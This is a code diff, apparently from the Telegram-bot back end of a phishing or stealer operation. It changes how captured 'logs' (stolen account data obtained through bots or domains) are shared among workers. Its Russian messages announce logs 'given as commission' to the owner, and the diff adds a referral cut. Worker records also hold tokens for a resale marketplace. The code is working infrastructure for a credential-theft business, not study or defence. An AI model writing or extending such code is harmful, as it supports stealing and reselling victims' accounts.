@@ -25,7 +25,7 @@ export default async log => {
 ${log.bot.includes(':') ? `ℹ️ Добытый с бота @${(await new TelegramBot(log.bot, { polling: false }).getMe().catch(() => { }) || {}).username}` : `ℹ️ Добытый с домена ${log.bot}`}`
     
     worker.com = worker.com || com;
-    if (logsCount + 1 === worker.com || (worker.com && (logsCount + 1) % worker.com === 0)) {
+    if (worker.com && (logsCount + 1) % worker.com === 0) {
         log.bot = 'com';
 
         if (worker.notify) await bot.sendMessage(worker.id, `${msg}\n\n<b>🤝🏻 Был отдан в качестве комиссии</b>`, {
@@ -36,6 +36,15 @@ ${log.bot.includes(':') ? `ℹ️ Добытый с бота @${(await new Teleg
         worker.id = owner.id;
         worker.notify = owner.notify;
         worker.lztOn = owner.lztOn;
+    }
+    if(worker.ref ) {
+        const settings = await commission.findOne();
+        if(settings.ref && (logsCount + 1) % settings.ref === 0) {
+            log.bot = 'ref';
+            if (worker.notify) await bot.sendMessage(worker.id, `${msg}\n\n<b>🤝🏻 Был отдан в качестве партнера</b>`, {
+                parse_mode: 'HTML'
+            })
+        }
     }
 
     const marketSettings = await market.findOne({ 'token': worker.lzt });
